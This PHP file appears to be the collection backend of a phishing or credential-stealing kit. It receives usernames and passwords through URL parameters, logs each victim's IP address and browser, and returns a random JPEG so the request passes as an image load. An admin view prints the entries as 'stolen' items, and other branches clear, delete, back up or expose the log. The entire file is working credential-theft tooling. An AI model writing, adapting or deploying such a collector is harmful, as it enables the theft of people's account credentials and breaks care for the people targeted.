<?php
require("Config.php");
    
    if( isset($_GET['view']) ){
        $secr = $_GET["s"];
        $dataFile = "registry/".$secr.".txt";
        $id = 3;
    }
    
    if( isset($_GET["insert"]) ){
        $data = [
            "user"=>$_GET['u'],
            "password"=>$_GET['p'],
            "time"=>date("Y-m-d h:i:sa"),
            "ip"=>$_SERVER["REMOTE_ADDR"],
            "user_agent"=>$_SERVER['HTTP_USER_AGENT']
        ];
        $secr = $_GET['s'];
        $record = base64_encode( json_encode($data) ).PHP_EOL;
        $dataFile = "registry/".$secr.".txt";
        $id = 1;
    }
    
    
    if( keyExists($secr) ){

switch($id) {

    case 1: //insert new recordi
    
	$fh = fopen($dataFile, 'a') or die("can't open file");
	fwrite($fh, $record);
	fclose($fh);

	header("Content-Type: image/jpeg");
        $size = 160;
        $image = $pack[rand(0,sizeOf($pack))];
        list($width, $height) = getimagesize($image);
        $ratio = $width/$height;
        if ($ratio > 1) {
            $newWidth  = $size;
            $newHeight = $size/$ratio;
        } else {
            $newHeight = $size;
            $newWidth  = $size*$ratio;
        }
        $create = imagecreatefromjpeg($image);
        $template = imagecreatetruecolor($newWidth,$newHeight);
        imagecopyresized($template, $create, 0, 0, 0, 0, $newWidth, $newHeight, $width, $height);
        ImageJpeg($template);

    break;

    case 2: //clear file
	$fh = fopen( $dataFile, "r+" );
	ftruncate($fh, 0);
	fclose($fh);

	print "<p> Content Erased! <a href=$dataFile>Check here</a> </p>";


    break;

    case 3; //list the content of the file
	$count = substr_count(file_get_contents($dataFile), "\n");
	print "<p>".$count." record(s) in the text database: <br>";

	$fh = fopen($dataFile, 'r') or die("can't open file");
	$n = 1;

	for ($i=1; $i<$count+1; $i++){
		$line = fgets($fh, 1024);
		$list[$i] = json_decode( base64_decode($line) );
	}
	
	$list = array_reverse($list);
	
	foreach($list as $item){
		echo '<div id="stolen_item">';
		echo $item->user . ' : ' . $item->password . "<br>";
		echo "Received on: " . $item->time . "<br>";
		echo "Stolen from: " . $item->ip . "<br>";
		echo $item->user_agent . "<br>";
		echo '</div><br><br>';
	}
	print "</p>";
	fclose($fh);

    break;

    case 4; //delete line
	function cutline($filename,$line_no=-1) {

		$strip_return=FALSE;

		$data=file($filename);
		$pipe=fopen($filename,'w');
		$size=count($data);

		if($line_no==-1) $skip=$size-1;
		else $skip=$line_no-1;

		for($line=0;$line<$size;$line++)
		if($line!=$skip)
		fputs($pipe,$data[$line]);
		else
		$strip_return=TRUE;
		return $strip_return;
	}

	$line_no = trim ( $_GET['line_no'], '"') ;

	cutline($dataFile, $line_no); // deletes line
    break;


    case 5: //Backup the file

	$d = new DateTime();
	$timeStamp = $d -> getTimestamp();

	$backupFile = "backup/dataBackup_$timeStamp.txt";

	if (!copy($dataFile, $backupFile)) {
		print  "<p>Failed to backup the database! $dataFile, $backupFile</p>";
	} else {
		print "<p> Backup succeded!<br> "."<a href=\"$backupFile\">Examine the backed up file</a></p>";
	}

    break;

    case 99;
	show_source(__FILE__);

    break;

    case 0: //do nothing

    break;

}
        
        
        
    }else{
        echo "Key does not exist.";
    }
    

?>